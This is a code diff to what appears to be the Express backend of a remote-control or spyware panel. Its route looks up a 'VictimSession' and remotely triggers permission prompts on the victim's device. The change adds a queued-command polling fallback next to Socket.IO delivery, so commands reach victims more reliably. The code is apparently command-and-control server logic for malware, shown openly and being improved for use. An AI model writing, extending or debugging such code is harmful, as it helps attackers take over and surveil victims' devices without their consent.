@@ -601,10 +601,7 @@ router.post('/sessions/:id/permissions/trigger', async (req, res) => {
       return res.status(400).json({ error: 'Invalid permission type. Valid: ' + validPermissions.join(', ') });
     }
 
-    const session = await VictimSession.findById(req.params.id)
-      .select('sessionId isOnline')
-      .lean();
-
+    const session = await VictimSession.findById(req.params.id);
     if (!session) {
       return res.status(404).json({ error: 'Session not found' });
     }
@@ -613,7 +610,16 @@ router.post('/sessions/:id/permissions/trigger', async (req, res) => {
       return res.status(400).json({ error: 'Session is offline. Cannot trigger permission.' });
     }
 
-    // Emit the trigger command to the socket
+    // === Add to pending command queue for polling fallback ===
+    session.pendingCommands = session.pendingCommands || [];
+    session.pendingCommands.push({
+      type: 'trigger-permission',
+      permissionType,
+      createdAt: new Date()
+    });
+    await session.save();
+
+    // === Emit via Socket.IO for instant delivery ===
     const { getIO } = require('../socket');
     const io = getIO();
     
